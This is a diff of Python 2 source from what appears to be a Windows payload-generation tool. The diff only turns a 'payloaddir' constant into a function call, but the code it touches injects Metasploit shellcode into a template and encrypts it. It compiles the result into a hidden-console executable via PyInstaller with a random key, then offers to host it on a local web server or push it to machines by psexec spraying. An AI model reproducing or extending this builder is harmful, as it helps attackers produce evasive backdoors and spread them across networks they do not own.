@@ -7,8 +7,6 @@ from menu import *
 from encrypt import *
 from sockets import *
 
-payloaddir = '/etc/winpayloads'
-
 
 METASPLOIT_Functions = {
     'reverse': {
@@ -58,14 +56,14 @@ def askAndReturnModules(shellcode, metasploit_type):
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
-    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
+    with open('%s/payload.py' % payloaddir(), 'w+') as Filesave:
         Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
 
     randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))
     p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
-                          '%s/payload.py' % payloaddir, '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                          '%s/payload.py' % payloaddir(), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
@@ -78,12 +76,12 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
         print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
         sys.stdout.write(payloadstderr)
         raise KeyboardInterrupt
-    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir,payloadname))
-    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
+    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir(),payloadname))
+    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), payloadname) + t.normal
     CleanUpPayloadMess(payloadname)
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
-        DoClientUpload(payloaddir,payloadname,powershellExec=ez2read_shellcode,isExe=True)
+        DoClientUpload(payloaddir(),payloadname,powershellExec=ez2read_shellcode,isExe=True)
     else:
         DoPayloadUpload(payloadname)
 
@@ -92,15 +90,15 @@ def CleanUpPayloadMess(payloadname):
     os.system('rm dist -r')
     os.system('rm build -r')
     os.system('rm *.spec')
-    os.system('rm %s/payload.py' % payloaddir)
+    os.system('rm %s/payload.py' % payloaddir())
 
 def DoPayloadUpload(payloadname):
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        DoPsexecSpray(payloaddir + '/' + payloadname + '.exe')
+        DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
-        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir, port=8000, printIt = True)
+        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir(), port=8000, printIt = True)
 
 def DoClientUpload(payloaddir,payloadname,powershellExec,isExe):
     use_client_upload = raw_input(
